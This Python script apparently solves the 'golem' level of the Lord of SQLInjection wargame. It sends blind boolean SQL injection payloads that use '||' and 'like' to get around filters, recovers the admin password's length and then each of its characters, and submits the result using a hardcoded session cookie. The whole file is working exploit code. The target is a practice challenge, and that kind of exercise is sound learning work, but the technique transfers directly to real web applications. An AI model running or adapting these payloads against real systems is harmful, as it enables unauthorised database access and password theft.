import string
import requests


def find_password_length(n):
    payload = f"?pw='||id like 'admin' %26%26 LENGTH(pw) like {n} -- "
    if 'Hello admin' in send_request(payload):
        return n


def find_password(position, char):
    payload = f"?pw='||id like 'admin' %26%26 SUBSTRING(pw,{position},1) like '{char}' -- "
    if 'Hello admin' in send_request(payload):
        return char


def send_request(payload):
    url = 'https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php'
    cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
    r = requests.get(url + payload, cookies=cookie)
    return r.text


if __name__ == "__main__":
    pw = []
    characters = string.printable

    for i in range(100):
        if find_password_length(i):
            length = i
            print(f'pw length is {length}')
            break

    for i in range(1, length + 1):
        for char in characters:
            if find_password(i, char):
                pw.append(char.lower())
                print(f'pw = {pw}')
                break

    print(f'pw={"".join(pw)}')

    if 'GOLEM Clear!' in send_request(f'?pw={"".join(pw)}'):
        print('GOLEM Clear!')
    else:
        print('Something went wrong!!!')
